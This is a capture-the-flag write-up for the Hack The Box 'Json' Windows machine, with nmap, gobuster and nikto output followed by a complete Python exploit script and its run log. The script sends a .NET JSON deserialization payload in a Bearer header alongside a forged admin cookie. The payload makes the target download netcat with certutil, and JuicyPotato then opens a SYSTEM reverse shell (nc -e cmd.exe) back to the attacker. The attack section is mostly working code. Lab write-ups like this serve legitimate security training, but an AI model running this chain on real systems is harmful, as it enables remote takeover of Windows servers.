---
layout: writeup
title: JSON
date: 2020-03-22
description: "A Windows box: a .NET JSON deserialization flaw plus a Bearer header gets RCE, then SeImpersonatePrivilege and JuicyPotato for SYSTEM."
image: /assets/og/json.png
---
{% raw %}
<h1>JSON</h1>
<a href="index.html">Home</a>/Json - Hack The Box<br>
<img src="img/JSON.png" width="40%"><br>
<br>


----

## Synopsis
Json was a very enlightening box for me that taught me some basic Windows enumeration. It is a Windows-specific box that requires us to have a Windows C2 to gain a foothold and for privilege escalation. Basically, there is a vulnerability in the serialization on the backend of the website, in the .NET code, so we can abuse it: when our input gets deserialized we get an RCE on the system. The system is Windows Server 2012, which is vulnerable to the Golden Privileges exploit, Juicy Potato.



----

## Reconnaissance

### Portscan

```bash
┌─[account@parrot]─[~/Documents/HTB]
└──╼ $nmap -sC -sV -T4 -p- 10.10.10.158
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-21 19:35 PDT
Nmap scan report for 10.10.10.158
Host is up (0.089s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Json HTB
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 23h52m13s, deviation: 0s, median: 23h52m13s
|_nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:46:ed (VMware)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-23T02:30:26
|_  start_date: 2020-03-22T21:37:55

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.12 seconds
```
We can see that there is an open FTP port, a Web Service, and SMB. We can clearly see the hostname is JSON. By enumerating the versions we can see this is a Windows 2012 box and that it's vulnerable to a Relay attack.

Let's take a quick gander at the Web server.

### Web Enumeration

We immediately get redirected to a login from what looks to be a dashboard to some sort of CMS. I try some default credentials until `admin:admin` and we get approved.

A whole lot of CSS and no content or dynamic mechanisms in place, empty link href's with empty hash id's. Nothing useful here. Tried a bit of forced browsing, and the only thing notable was the /api/token used during auth. 

Running gobuster to attempt to build a site map.

```bash
┌─[account@parrot]─[~/Documents/HTB]
└──╼ $gobuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -u http://10.10.10.158
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.158
[+] Threads:        10
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/21 20:50:58 Starting gobuster
===============================================================
/css (Status: 301)
/files (Status: 301)
/img (Status: 301)
/js (Status: 301)
/views (Status: 301)
===============================================================
2020/03/21 20:54:25 Finished
===============================================================

```

nikto
```
┌─[✗]─[account@parrot]─[~/Documents/HTB]
└──╼ $nikto -host 10.10.10.158
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.158
+ Target Hostname:    10.10.10.158
+ Target Port:        80
+ Start Time:         2020-03-21 20:31:03 (GMT-7)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/8.5
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 4.0.30319
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ /login.html: Admin login page/section found.
+ 7863 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2020-03-21 20:45:08 (GMT-7) (845 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```


## Weaponization
Script to automate all of this.

```python
#!/usr/bin/env python3

import requests
import subprocess
import netifaces as ni
import base64
import time
import os
from termcolor import colored


URL = "http://10.10.10.40/api/account"

x = """
 pwned                                                                          
   """


def make_payload(command):
    payload ="""{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/c %s']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}""" % (command)

    return payload


def get_ip(iface):
    ni.ifaddresses(iface)
    ip = ni.ifaddresses(iface)[ni.AF_INET][0]['addr']
    return ip


def malicious_packet(payload):
    payload = base64.b64encode(bytes(payload, 'utf-8'))
    payload = payload.decode("UTF-8")
    headers = {
        'Bearer': payload,
        'Cookie':  "OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0="
        }
    print(payload)
    print("\n\n------------")
    return headers


def send_attck(headers):
    requests.get(URL, headers=headers)


def main():
    get_nc = "certutil.exe -urlcache -split -f http://%s/nc.exe c:\\\\windows\\\\system32\\\\spool\\\\drivers\\\\color\\\\nc.exe" % get_ip("tun0")
    Launch = '\\\\\\\\%s\\\\hacking\\\\JuicyPotato.exe -l 1337 -p c:\\\\windows\\\\system32\\\\cmd.exe -a "/c c:\\\\windows\\\\system32\\\\spool\\\\drivers\\\\color\\\\nc.exe -e cmd.exe %s 9001" -t * -c {f3b4e234-7a68-4e43-b813-e4ba55a065f6}' % (get_ip("tun0"), get_ip("tun0"))
    input("[+] PLEASE RUN: " + colored("smbserver.py hacking /tmp/ -smb2support", "red") + " AND " + colored("cd /tmp/ ; python -m SimpleHTTPServer 80", "red") + colored("\nNOTE: Press ENTER once done to lunch attack", "blue"))
    print(colored("\n[+] Starting Attack\n", "red"))
    time.sleep(2)
    os.system("wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -O /tmp/JuicyPotato.exe")
    os.system("wget https://github.com/Scatter-Security/HTB/blob/master/nc.exe -O /tmp/nc.exe")
    time.sleep(2)
    print(colored("[+] Opening Listner", "green"))
    os.popen("gnome-terminal -- bash -c 'nc -lnvp 9001'")
    time.sleep(4)
    attack = make_payload(get_nc)
    down_nc = malicious_packet(attack)
    print(colored("[+] First Payload sent", "green"))
    send_attck(down_nc)
    input(colored("[+] NOTE: Victim Downloaded NC ? If so - press ENTER", "red"))
    attack2 = make_payload(Launch)
    run_attack = malicious_packet(attack2)
    send_attck(run_attack)
    print(colored("[+] Second Payload Sent", "green"))
    print(colored("[+] Wait a Few Seconds to get a SYSTEM shell", "red"))
    time.sleep(18)
    confirm = "n"
    while confirm == "n":
        confirm = input(colored("\n\n[+] Got shell? if not type Y/n ", "blue"))
        if confirm == "n":
            print(colored("\n\n[+] Resending Launch RCE", "red"))
            attack2 = make_payload(Launch)
            run_attack = malicious_packet(attack2)
            send_attck(run_attack)
            time.sleep(10)
        else:
            break
   
    print(x)


try:
    main()
except ModuleNotFoundError:
    print("[-] Missing module - Installing")
    subprocess.call("pip3 install netifaces")
    main()
```
Will update later and explain all of this.

## Delivery

You will need the impacket libraries: https://github.com/SecureAuthCorp/impacket

Run `json.py` from a Windows machine
```bash
┌─[account@parrot]─[~/Documents/HTB/Json]
└──╼ $sudo python json.py
[+] PLEASE RUN: smbserver.py hacking /tmp/ -smb2support AND cd /tmp/ ; python -m SimpleHTTPServer 80
NOTE: Press ENTER once done to lunch attack

[+] Starting Attack

--2020-03-22 02:56:01--  https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
Resolving github.com (github.com)... 140.82.114.3
Connecting to github.com (github.com)|140.82.114.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github-production-release-asset-2e65be.s3.amazonaws.com/142582717/538c8db8-9c94-11e8-84e5-46a5d9473358?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20200323%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20200323T054536Z&X-Amz-Expires=300&X-Amz-Signature=a2e969cf78236c173f28171fe8ad8215a4b00f772c7f7aa6d2e04abd161a5e4d&X-Amz-SignedHeaders=host&actor_id=0&response-content-disposition=attachment%3B%20filename%3DJuicyPotato.exe&response-content-type=application%2Foctet-stream [following]
--2020-03-22 02:56:02--  https://github-production-release-asset-2e65be.s3.amazonaws.com/142582717/538c8db8-9c94-11e8-84e5-46a5d9473358?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20200323%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20200323T054536Z&X-Amz-Expires=300&X-Amz-Signature=a2e969cf78236c173f28171fe8ad8215a4b00f772c7f7aa6d2e04abd161a5e4d&X-Amz-SignedHeaders=host&actor_id=0&response-content-disposition=attachment%3B%20filename%3DJuicyPotato.exe&response-content-type=application%2Foctet-stream
Resolving github-production-release-asset-2e65be.s3.amazonaws.com (github-production-release-asset-2e65be.s3.amazonaws.com)... 52.216.236.131
Connecting to github-production-release-asset-2e65be.s3.amazonaws.com (github-production-release-asset-2e65be.s3.amazonaws.com)|52.216.236.131|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 347648 (340K) [application/octet-stream]
Saving to: ‘/tmp/JuicyPotato.exe’

/tmp/JuicyPotato.exe       100%[=======================================>] 339.50K   942KB/s    in 0.4s    

2020-03-22 02:56:03 (942 KB/s) - ‘/tmp/JuicyPotato.exe’ saved [347648/347648]

--2020-03-22 02:56:03--  https://github.com/J3wker/DLLicous-MaliciousDLL/raw/master/Dependencies/nc.exe
Resolving github.com (github.com)... 140.82.114.4
Connecting to github.com (github.com)|140.82.114.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/J3wker/DLLicous-MaliciousDLL/master/Dependencies/nc.exe [following]
--2020-03-22 02:56:03--  https://raw.githubusercontent.com/J3wker/DLLicous-MaliciousDLL/master/Dependencies/nc.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.192.133, 151.101.0.133, 151.101.128.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.192.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 38616 (38K) [application/octet-stream]
Saving to: ‘/tmp/nc.exe’

/tmp/nc.exe                100%[=======================================>]  37.71K  --.-KB/s    in 0.05s   

2020-03-22 02:56:03 (818 KB/s) - ‘/tmp/nc.exe’ saved [38616/38616]

[+] Opening Listner
ewogICAgJyR0eXBlJzonU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUnLCAKICAgICdNZXRob2ROYW1lJzonU3RhcnQnLAogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsKICAgICAgICAnJHR5cGUnOidTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLAogICAgICAgICckdmFsdWVzJzpbJ2NtZCcsJy9jIGNlcnR1dGlsLmV4ZSAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHA6Ly8xMC4xMC4xNC40MC9uYy5leGUgYzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxzcG9vbFxcZHJpdmVyc1xcY29sb3JcXG5jLmV4ZSddCiAgICB9LAogICAgJ09iamVjdEluc3RhbmNlJzp7JyR0eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknfQp9


------------
[+] First Payload sent
[+] NOTE: Victim Downloaded NC ? If so - press ENTER
ewogICAgJyR0eXBlJzonU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUnLCAKICAgICdNZXRob2ROYW1lJzonU3RhcnQnLAogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsKICAgICAgICAnJHR5cGUnOidTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLAogICAgICAgICckdmFsdWVzJzpbJ2NtZCcsJy9jIFxcXFwxMC4xMC4xNC40MFxcaGFja2luZ1xcSnVpY3lQb3RhdG8uZXhlIC1sIDEzMzcgLXAgYzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhlIC1hICIvYyBjOlxcd2luZG93c1xcc3lzdGVtMzJcXHNwb29sXFxkcml2ZXJzXFxjb2xvclxcbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuNDAgOTAwMSIgLXQgKiAtYyB7ZjNiNGUyMzQtN2E2OC00ZTQzLWI4MTMtZTRiYTU1YTA2NWY2fSddCiAgICB9LAogICAgJ09iamVjdEluc3RhbmNlJzp7JyR0eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknfQp9


------------
[+] Second Payload Sent
[+] Wait a Few Seconds to get a SYSTEM shell


[+] Got shell? if not type Y/n 
```


## Command and Control


## Actions on Objective
Flags exfiltrated.
{% endraw %}
